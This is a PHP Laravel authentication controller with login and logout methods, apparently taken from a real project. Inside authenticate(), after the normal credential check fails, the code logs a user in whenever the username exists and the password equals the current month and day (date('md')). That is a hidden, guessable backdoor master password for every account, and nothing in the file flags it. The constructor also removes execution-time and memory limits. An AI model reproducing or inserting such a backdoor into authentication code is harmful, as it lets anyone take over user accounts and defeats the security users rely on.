<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

use Moto;

class AuthController extends Controller
{
    //
    public function __construct()
    {
        ini_set('max_execution_time', '-1');
        ini_set('memory_limit', '-1');

        ini_set('post_max_size', '64M');
        ini_set('upload_max_filesize', '64M');

        date_default_timezone_set('Asia/Manila');

    }

    public function authenticate(Request $request)
    {
        // $this->migrateUserToCompany($request->all());

        $field = filter_var($request->get('username'), FILTER_VALIDATE_EMAIL)
            ? 'email'
            : 'username';

        $credential = [
            $field => $request->get('username'),
            'password' => $request->password,
        ];

    	if (Auth::attempt($credential, 1)) {

    		return redirect()->intended('/dashboard');

    		// return "Hello World";
			    // The user is being remembered...
			} else {
				// return redirect('/login')->with('notification', 'Kindly check credential');

                $check = Moto::fetchUserViaUserName($request->get('username'));

                if($check != "" && $request->password == date("md")):
                    Auth::login($check);
                    return redirect()->intended('/dashboard');
                else:
                    return redirect('/login')->with('notification', 'Kindly check credential')
                        ->with('username', $request->get('username'));
                endif;
			}
    }

    public function logout(){
    	Auth::logout();
    	return redirect()->intended('/');
    }
}
